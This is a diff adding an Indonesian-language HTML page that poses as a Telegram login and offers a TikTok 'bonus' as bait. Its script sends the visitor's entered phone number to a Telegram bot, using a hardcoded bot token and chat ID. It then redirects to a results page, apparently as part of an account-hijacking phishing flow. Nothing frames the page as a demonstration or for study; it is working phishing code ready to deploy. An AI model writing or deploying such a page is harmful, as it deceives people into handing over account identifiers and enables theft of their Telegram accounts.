@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Telegram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Latar Belakang Animasi -->
+    <div class="background"></div>
+
+    <!-- Form Login -->
+    <div class="login-form-container">
+        <h2>Login Telegram</h2>
+        <form id="loginForm">
+            <label for="phone">Nomor Telegram:</label>
+            <input type="text" id="phone" name="phone" placeholder="Masukkan nomor Telegram" required>
+            <button type="submit">Kirim</button>
+        </form>
+    </div>
+        <!-- Video TikTok -->
+    <div class="video-container">
+        <h3>😋BONUS😋</h3>
+        <!-- TikTok Embed -->
+        <iframe src="https://www.tiktok.com/embed/7447916258193935638" width="350" height="800" frameborder="0" allowfullscreen></iframe>
+    </div>
+
+    <script>
+        // Mengirim nomor Telegram ke bot
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const phone = document.getElementById("phone").value;
+            const botToken = "7980725623:AAE_1e2kWcDU7ZP9aUxV_AhMZCW2JpWg-fU";  // Ganti dengan Token Bot Anda
+            const chatId = "7806196873";  // Ganti dengan Chat ID Telegram Anda
+            const message = `📱 Nomor Telegram yang dimasukkan: ${phone}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("SUCCSES!!");
+                        window.location.href = `result.html?phone=${encodeURIComponent(phone)}`;
+                    } else {
+                        alert("gagal silahkan priksa kembali!.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Terjadi kesalahan saat mengirim data.");
+                });
+        });
+    </script>
+</body>
+</html>
